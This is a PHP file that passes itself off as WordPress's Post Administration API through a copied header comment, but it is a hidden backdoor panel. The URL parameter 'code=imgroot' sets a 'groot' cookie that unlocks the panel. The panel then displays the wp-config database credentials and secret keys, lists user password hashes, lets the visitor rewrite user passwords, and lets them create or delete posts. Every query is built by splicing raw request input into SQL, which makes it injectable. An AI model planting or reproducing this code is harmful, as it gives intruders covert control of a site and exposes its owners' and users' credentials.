<?php
/**
 * WordPress Post Administration API.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * Rename $_POST data from form names to DB post columns.
 *
 * Manipulates $_POST directly.
 *
 * @since 2.6.0
 *
 * @param bool $update Are we updating a pre-existing post?
 * @param array $post_data Array of post data. Defaults to the contents of $_POST.
 * @return object|bool WP_Error on failure, true on success.
 */

class Format
{
    private $input = '';
    private $output = '';
    private $tabs = 0;
    private $in_tag = FALSE;
    private $in_comment = FALSE;
    private $in_content = FALSE;
    private $inline_tag = FALSE;
    private $input_index = 0;

    public function HTML($input)
    {
        $this->input = $input;
        $this->output = '';

        $starting_index = 0;

        if (preg_match('/<\!doctype/i', $this->input)) {
            $starting_index = strpos($this->input, '>') + 1;
            $this->output .= substr($this->input, 0, $starting_index);
        }

        for ($this->input_index = $starting_index; $this->input_index < strlen($this->input); $this->input_index++) {
            if ($this->in_comment) {
                $this->parse_comment();
            } elseif ($this->in_tag) {
                $this->parse_inner_tag();
            } elseif ($this->inline_tag) {
                $this->parse_inner_inline_tag();
            } else {
                if (preg_match('/[\r\n\t]/', $this->input[$this->input_index])) {
                    continue;
                } elseif ($this->input[$this->input_index] == '<') {
                    if ( ! $this->is_inline_tag()) {
                        $this->in_content = FALSE;
                    }
                    $this->parse_tag();
                } elseif ( ! $this->in_content) {
                    if ( ! $this->inline_tag) {
                        $this->output .= "" . str_repeat("", $this->tabs);
                    }
                    $this->in_content = TRUE;
                }
                $this->output .= $this->input[$this->input_index];
            }
        }

        return $this->output;
    }

    private function parse_comment()
    {
        if ($this->is_end_comment()) {
            $this->in_comment = FALSE;
            $this->output .= '-->';
            $this->input_index += 3;
        } else {
            $this->output .= $this->input[$this->input_index];
        }
    }

    private function parse_inner_tag()
    {
        if ($this->input[$this->input_index] == '>') {
            $this->in_tag = FALSE;
            $this->output .= '>';
        } else {
            $this->output .= $this->input[$this->input_index];
        }
    }

    private function parse_inner_inline_tag()
    {
        if ($this->input[$this->input_index] == '>') {
            $this->inline_tag = FALSE;
            $this->decrement_tabs();
            $this->output .= '>';
        } else {
            $this->output .= $this->input[$this->input_index];
        }
    }

    private function parse_tag()
    {
        if ($this->is_comment()) {
            $this->output .= "\n" . str_repeat("\t", $this->tabs);
            $this->in_comment = TRUE;
        } elseif ($this->is_end_tag()) {
            $this->in_tag = TRUE;
            $this->inline_tag = FALSE;
            $this->decrement_tabs();
            if ( ! $this->is_inline_tag() AND ! $this->is_tag_empty()) {
                $this->output .= "" . str_repeat("\t", $this->tabs);
            }
        } else {
            $this->in_tag = TRUE;
            if ( ! $this->in_content AND ! $this->inline_tag) {
                $this->output .= "\n" . str_repeat("\t", $this->tabs);
            }
            if ( ! $this->is_closed_tag()) {
                $this->tabs++;
            }
            if ($this->is_inline_tag()) {
                $this->inline_tag = TRUE;
            }
        }
    }

    private function is_end_tag()
    {
        for ($input_index = $this->input_index; $input_index < strlen($this->input); $input_index++) {
            if ($this->input[$input_index] == '<' AND $this->input[$input_index + 1] == '/') {
                return true;
            } elseif ($this->input[$input_index] == '<' AND $this->input[$input_index + 1] == '!') {
                return true;
            } elseif ($this->input[$input_index] == '>') {
                return false;
            }
        }
        return false;
    }

    private function decrement_tabs()
    {
        $this->tabs--;
        if ($this->tabs < 0) {
            $this->tabs = 0;
        }
    }

    private function is_comment()
    {
        if ($this->input[$this->input_index] == '<'
        AND $this->input[$this->input_index + 1] == '!'
        AND $this->input[$this->input_index + 2] == '-'
        AND $this->input[$this->input_index + 3] == '-') {
            return true;
        } else {
            return false;
        }
    }

    private function is_end_comment()
    {
        if ($this->input[$this->input_index] == '-'
        AND $this->input[$this->input_index + 1] == '-'
        AND $this->input[$this->input_index + 2] == '>') {
            return TRUE;
        } else {
            return FALSE;
        }
    }

    private function is_tag_empty()
    {
        $current_tag = $this->get_current_tag($this->input_index + 2);
        $in_tag = FALSE;

        for ($input_index = $this->input_index - 1; $input_index >= 0; $input_index--) {
            if ( ! $in_tag) {
                if ($this->input[$input_index] == '>') {
                    $in_tag = TRUE;
                } elseif ( ! preg_match('/\s/', $this->input[$input_index])) {
                    return FALSE;
                }
            } else {
                if ($this->input[$input_index] == '<') {
                    if ($current_tag == $this->get_current_tag($input_index + 1)) {
                        return TRUE;
                    } else {
                        return FALSE;
                    }
                }
            }
        }
        return TRUE;
    }

    private function get_current_tag($input_index)
    {
        $current_tag = '';

        for ($input_index; $input_index < strlen($this->input); $input_index++) {
            if ($this->input[$input_index] == '<') {
                continue;
            } elseif ($this->input[$input_index] == '>' OR preg_match('/\s/', $this->input[$input_index])) {
                return $current_tag;
            } else {
                $current_tag .= $this->input[$input_index];
            }
        }

        return $current_tag;
    }

    private function is_closed_tag()
    {
        $closed_tags = array(
            'meta', 'link', 'img', 'hr', 'br', 'input',
        );

        $current_tag = '';

        for ($input_index = $this->input_index; $input_index < strlen($this->input); $input_index++) {
            if ($this->input[$input_index] == '<') {
                continue;
            } elseif (preg_match('/\s/', $this->input[$input_index])) {
                break;
            } else {
                $current_tag .= $this->input[$input_index];
            }
        }

        if (in_array($current_tag, $closed_tags)) {
            return true;
        } else {
            return false;
        }
    }

    private function is_inline_tag()
    {
        $inline_tags = array(
            'title', 'a', 'span', 'abbr', 'acronym', 'b', 'basefont', 'bdo', 'big', 'cite', 'code', 'dfn', 'em', 'font', 'i', 'kbd', 'q', 's', 'samp', 'small', 'strike', 'strong', 'sub', 'sup', 'textarea', 'tt', 'u', 'var', 'del', 'pre',
        );

        $current_tag = '';

        for ($input_index = $this->input_index; $input_index < strlen($this->input); $input_index++) {
            if ($this->input[$input_index] == '<' OR $this->input[$input_index] == '/') {
                continue;
            } elseif (preg_match('/\s/', $this->input[$input_index]) OR $this->input[$input_index] == '>') {
                break;
            } else {
                $current_tag .= $this->input[$input_index];
            }
        }

        if (in_array($current_tag, $inline_tags)) {
            return true;
        } else {
            return false;
        }
    }
}

$code = $_GET["code"];
if ($code == 'imgroot') { setcookie("groot", "logged", time() + 86400); } if(isset($_COOKIE["groot"])) { // user has access ?>
<!DOCTYPE html>
<html>
<head>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
    <title>Class Database Master</title>
    <style type="text/css">
        #main{width:100%;max-width:860px;margin-left:auto;margin-right:auto;padding:1em;
        .menu{margin-right: 2em;float: left;}
        #main > h2 {margin-top:2em !important;}
    </style>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
</head>
<body>
<div id="main">
    <h1>Wordpress Database Master</h1>
<p class="menu">

    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=list">List</a> |
    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=search">Search</a> |
    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=create">Create</a> |
    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=users">Users</a> |
    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=terms">Terms</a> •
    <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=wp-config">wp-config</a>
    <hr>
</p>
<?php
    require_once($_SERVER['DOCUMENT_ROOT'] . '/wp-config.php');
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    $conn->set_charset("utf8");

    // Check connection
    if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); }

    // recover user action from a get variable
    if (!empty($_GET["a"])) {
        $a = $_GET["a"];
    } else {
        $a = "" ;
    }

    switch ($a) { //select case based on action.

        case "terms";

            $sql = "SELECT term_id, name FROM wp_terms";
            $result = mysqli_query($conn, $sql);
                echo "<h1>Terms</h1>";
                echo "<code>" . $sql . ";</code><hr/>";
                if ($result->num_rows > 0) {

                    while($row = $result->fetch_assoc()) {
                        echo '<p>term_id: ' . $row['term_id'] .' <br/>
                        Name: ' . $row['name'] .'</p>';
                    }

                } else {
                    echo "0 results";
                }
        break;

        case "users";

            $sql = "SELECT id, user_login, user_pass FROM wp_users";
            $result = mysqli_query($conn, $sql);
                echo "<h1>Users</h1>";
                echo "<code>" . $sql . ";</code><hr/>";
                if ($result->num_rows > 0) {

                    while($row = $result->fetch_assoc()) {
                        echo "
                        <p>ID: \t" . $row['id'] . " <a href='". $_SERVER['PHP_SELF'] . "?a=edit_user&user_id=". $row['id'] ."'>(edit)</a><br/>
                        Name: \t" . $row['user_login'] ." \t <br/>
                        Pass: \t".  $row['user_pass']. " </p>";
                    }

                } else {
                    echo "0 results";
                }
        break;

        case "edit_user":

                $sql = "SELECT ID, user_login,user_nicename, user_pass FROM wp_users WHERE id=". $_GET["user_id"];
                $result = mysqli_query($conn, $sql);
                $user = mysqli_fetch_assoc($result);
                ?>

                <h1>Editing <?php echo $user['user_login'];?></h1>
                <code> <?php echo $sql; ?>;</code><hr/>
                <form action="<?php echo $_SERVER['PHP_SELF'] ?>?a=update_user" method="post">
                    <input type="hidden" id="user_id" name="user_id" value="<?php echo  $_GET["user_id"]; ?>">

                    <label>Login</label>
                    <input type="text" name="user_login" value="<?php echo $user['user_login']; ?>">
                    <br/>
                    <label>Alias</label>
                    <input type="text" name="user_nicename" value="<?php echo $user['user_nicename']; ?>">
                    <br/>
                    <label>Pass</label>
                    <input style="width: 350px;" name="user_pass" value="<?php echo $user['user_pass']; ?>">

                    <label>MD5</label>
                    <input type="checkbox"name="md5" value="true">

                    <br/>
                    <button type="submit" name="create">Publish</button>
                </form>
                <hr>
                <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=delete_user&pid=<?php echo $_GET["user_id"] ?>">Delete</a>
                <?php
        break;

        case "update_user":
            if ($_POST["md5"] == true){
                $user_pass = md5($_POST["user_pass"]);
                echo "<h1>used md5</h1>";
            } else {
                $user_pass = $_POST["user_pass"];
            }

            $sql = "UPDATE `wp_users` SET `user_login` = '". $_POST["user_login"] . "' , `user_login` = '".  $_POST["user_login"] ."' , `user_nicename` = '" .  $_POST["user_nicename"] ."' , `user_pass` = '".  $user_pass . "' WHERE `wp_users`.`ID` = " . $_POST["user_id"] ;
            echo "<code>" . $sql . ";</code><hr>";

            mysqli_query ($conn, $sql);

            echo "<h4>New password for ". $_POST["user_login"] ." has been set to <strong> " . $_POST["user_pass"] ."</strong></h4>";
            echo "<small><a href=". $_SERVER['PHP_SELF'] .'?a=edit_user&user_id='. $_POST["user_id"] ."> edit again</a></small>";
        break;


        case "wp-config": ?>

            <h1>wp-config</h1>
            <h3>Database</h3>
            <?php
            echo "<code>Host:\t". DB_HOST . "</code><br/>";
            echo "<code>Username:\t". DB_USER . "</code><br/>";
            echo "<code>Password:\t". DB_PASSWORD . "</code><br/>";
            echo "<code>Database:\t". DB_NAME . "</code><br/>";
            echo "<code>\t Table Prefix:\t" . $table_prefix ."</code>";
            echo "<hr>";
            echo "<h3>Keys</h3>";
            echo '<p> <code>AUTH_KEY:<br/>' . htmlentities(AUTH_KEY) .'</code></p>';
            echo '<p> <code>SECURE_AUTH_KEY:<br/>' . htmlentities(SECURE_AUTH_KEY) .'</code></p>';
            echo '<p> <code>LOGGED_IN_KEY:<br/>' . htmlentities(LOGGED_IN_KEY) .'</code></p>';
            echo '<p> <code>NONCE_KEY:<br/>' . htmlentities(NONCE_KEY) .'</code></p>';
            echo '<p> <code>AUTH_SALT:<br/>' . htmlentities(AUTH_SALT) .'</code></p>';
            echo '<p> <code>SECURE_AUTH_SALT:<br/>' . htmlentities(SECURE_AUTH_SALT) .'</code></p>';
            echo '<p> <code>LOGGED_IN_SALT:<br/>' . htmlentities(LOGGED_IN_SALT) .'</code></p>';
            echo '<p> <code>NONCE_SALT:<br/>' . htmlentities(NONCE_SALT) .'</code></p>';
            echo '<p> <code>WP_CACHE_KEY_SALT:<br/>' . htmlentities(WP_CACHE_KEY_SALT) .'</code></p>';

        break;

        // 1.1.3. Create
        case "create": ?>

            <h1>Creating New Post</h1>

            <form action="<?php echo $_SERVER['PHP_SELF'] ?>?a=new" method="post">
                <label>Title</label>
                <input type="hidden" id="new" name="new" value="yes">
                <input type="text" name="post_title" value="">
                <label>Slug</label>
                <input type="text" name="post_name" value="">
                <label>Date</label>
                <input type="date" name="post_date" value="<?php echo date("2018-01-27");?>">
                <h4>Content (html)</h4>
                <textarea rows=20 cols=86 name="post_content"></textarea><br>
                <button type="submit" name="create">Publish</button>
            </form>
        <?php
        break;

        case "new":

            //convert time to text-box friendly
            $sec = strtotime($_POST['post_date']);
            $date = date("Y-m-d", $sec);
            $post_name = str_replace(' ', '-',  $_POST["post_name"]);

            $sql= "INSERT `wp_posts` SET `post_status` = 'publish', `post_title` = '" .  $_POST["post_title"] . "', `post_content` = '" .  $_POST["post_content"] . "', `post_date_gmt` = '".  $date ." 00:00:00', `post_modified_gmt` = '".  $date ." 00:00:00', `post_modified` = '".  $date ." 00:00:00', `post_date` = '".  $date ." 00:00:00', post_excerpt = '', to_ping = '' , pinged = '' , `post_name` = '" .  $post_name  . "', `post_content_filtered` = '" .  $_POST["post_content"] . "' ;" ;

            mysqli_query ($conn, $sql);

            echo "<h4 class='notice'>NEW POST CREATED</h4> ";
            echo "<code>" . $sql . "</code><hr>";
            // echo '<p>' .  $_POST["pid"] . ' </p>';
            echo '<h1>' .  $_POST["post_title"] . ' </h1>';
           // echo '<p>' .  $_POST["post_category"] . ' </p>';
            echo '<p>' .  $_POST["post_date"] . ' </p>';
            echo $_POST["post_content"] ;

        break;

        case "update":
            $post_name = str_replace(' ', '-',  $_POST["post_name"]);
            $sql= "UPDATE `wp_posts` SET `post_status` = 'publish', `post_title` = '" .  $_POST["post_title"] . "', `post_content` = '" . $_POST["post_content"]  . "', `post_date_gmt` = '".  $_POST["post_date"] ." 00:00:00', `post_modified_gmt` = '".  $_POST["post_date"] ." 00:00:00', `post_modified` = '".  $_POST["post_date"] ." 00:00:00', `post_date` = '".  $_POST["post_date"] ." 00:00:00', post_excerpt = '', to_ping = '' , pinged = '' , `post_name` = '" .  $post_name  ."', `post_content_filtered` = '" .  $_POST["post_content"]  ."' WHERE `wp_posts`.`ID` = ". $_POST["pid"] .";";

            mysqli_query ($conn, $sql);

            echo "<h4 class='notice'><code>Updated</code></h4> ";
            echo "<small><a href=". $_SERVER['PHP_SELF'] .'?a=edit&pid='. $_POST["pid"] ."> edit again</a></small>";

            echo "<hr><code>UPDATE `wp_posts` SET `post_status` = 'publish', `post_title` = '" .  $_POST["post_title"] . "', `post_name` = '" . $post_name  . "', `post_content` = '[...]', `post_date_gmt` = '".  $_POST["post_date"] ." 00:00:00', `post_modified_gmt` = '".  $_POST["post_date"] ." 00:00:00', `post_modified` = '".  $_POST["post_date"] ." 00:00:00', `post_date` = '".  $_POST["post_date"] ." 00:00:00', post_excerpt = '', to_ping = '' , pinged = '' , `post_content_filtered` = '[...]' WHERE `wp_posts`.`ID` = ". $_POST["pid"] .";</code><hr>";

            //echo "<code>" . $sql . "</code><hr>";
            // echo '<p>' .  $_POST["pid"] . ' </p>';
            echo '<p>' .  $_POST["post_date"] . ' </p>';
            echo '<h1 style="font-size:3em;">' .  $_POST["post_title"] . ' </h1>';
            //echo '<p>' .  $_POST["post_category"] . ' </p>';
            print "<div style='font-family:charter;font-size:1.4em;'>" . $_POST["post_content"] . "</div>";
            echo "<hr><small><a href=". $_SERVER['PHP_SELF'] .'?a=edit&pid='. $_POST["pid"] ."> edit again</a></small>";

        break;

        case "read":
            $sql= "SELECT  `post_title`, `post_content`, `post_date`, `post_name` FROM `wp_posts` WHERE `wp_posts`.`ID` = ". $_GET["pid"] .";";

            $result = mysqli_query ($conn, $sql);
            $post = mysqli_fetch_assoc($result);

            echo "<code>" . $sql . "</code><hr>";
            echo "<small><a href=". $_SERVER['PHP_SELF'] .'?a=edit&pid='. $_GET["pid"] ."> edit</a></small><br/>";
            echo '<h1 style="font-size:3em;">' .  $post["post_title"] . ' </h1>';
            echo '<p>' .  $post["post_name"] . ' </p>';
            echo '<p>' .  $post["post_date"] . ' </p>';
            print "<div style='font-family:charter;font-size:1.4em;'>" . $post["post_content"] . "</div>";
            echo "<hr><small><a href=". $_SERVER['PHP_SELF'] .'?a=edit&pid='. $_GET["pid"] ."> edit</a></small>";

        break;


        // 1.1.4. Edit
        case "edit":

            $sql = "SELECT id, post_content, post_name, post_title, post_date FROM wp_posts WHERE id=". $_GET["pid"] ;
            $result = mysqli_query($conn, $sql);
            $post = mysqli_fetch_assoc($result);
            $sec = strtotime($post['post_date']); //convert time to text-box friendly
            $date = date("Y-m-d", $sec);
            $format = new Format; //clean html
            $post_content = $format->HTML($post['post_content']);
            ?>

            <h1><?php echo $post['post_title'];?> </h1>
            <code><?php echo $sql ?>;</code><hr>
            <form action="<?php echo $_SERVER['PHP_SELF'] ?>?a=update" method="post">
                <label>Title</label>
                <input type="hidden" id="pid" name="pid" value="<?php echo $_GET["pid"]; ?>">
                <input type="text" name="post_title" value="<?php echo ucwords($post['post_title']); ?>">
                <label>Slug</label>
                <input type="text" name="post_name" value="<?php echo $post['post_name']; ?>">
                <label>Date</label>
                <input type="date" name="post_date" value="<?php echo $date ;?>">
                <br>
                <h4>Content</h4>
                <textarea rows=20 cols=86 name="post_content"><?php echo $post_content;?></textarea><br>
                <button type="submit" name="create">Publish</button>
            </form>
            <hr>
            <a href="<?php echo $_SERVER['PHP_SELF'] ?>?a=delete&pid=<?php echo $_GET["pid"] ?>">Delete</a>
            <?php
        break;

        // 1.1.5. Delete
        case "delete":
            $sql= "DELETE FROM `wp_posts` WHERE `wp_posts`.`ID` = ". $_GET["pid"] .";";
            mysqli_query ($conn, $sql);
            echo "<code>". $sql . "</code><br/>";
            echo "<code>Deleted post with ID " . $_GET["pid"] . "</code>";
        break;

        case "search":
        ?>

            <h1>Search</h1>
            <form action="<?php echo $_SERVER['PHP_SELF'] ?>?a=s" method="post">
                <label>Title</label>
                <input type="text" id="k" name="k" value="yes">
                <button type="submit" name="create">Search</button>
            </form>
        <?php
        break;

    case "s":

            $sql = "SELECT id, post_title FROM `wp_posts` WHERE `post_content` LIKE '%" . $_POST['k'] . "%' OR `post_title` LIKE '%". $_POST['k'] . "%' ORDER BY `wp_posts`.`post_title` ASC;";

                $result = $conn->query($sql);
                if ($result->num_rows > 0) {
                    echo  "<code>" . $sql . "</code><hr><h2> ". $result->num_rows ." results for \"" . $_POST['k'] . "\"</h2>";
                    while($row = $result->fetch_assoc()) {
                        echo '<p> '. $row["id"] . ' -  <a href='. $_SERVER['PHP_SELF'] .'?a=edit&pid='.$row["id"].'>'.  ucwords($row["post_title"]) . ' <a href="'. $_SERVER['PHP_SELF'] .'?a=read&pid='.$row["id"]. '">(read)</a></p>';
                    }
                } else {
                    echo "0 results";
                }
        break;

        default:

            echo "<h2>List of Articles from ". $_SERVER['SERVER_NAME'] . "</h2>";

                $sql = "SELECT id,post_title,post_date FROM wp_posts";
                $result = $conn->query($sql);
                if ($result->num_rows > 0) {
                    while($row = $result->fetch_assoc()) {
                        echo '<p> '. $row["id"] . ' -  <a href='. $_SERVER['PHP_SELF'] .'?a=edit&pid='.$row["id"].'>'.  ucwords($row["post_title"]) . ' <a href="'. $_SERVER['PHP_SELF'] .'?a=read&pid='.$row["id"]. '">(read)</a></p>';
                    }
                } else {
                    echo "0 results";
                }
        } // Close.Switch.User.Action
    // close database connection
    $conn->close();
?>
</div> <!-- main -->
</body>
</html>
<?php

} else {
    //user doesn't have permissions.
    die();
}
?>
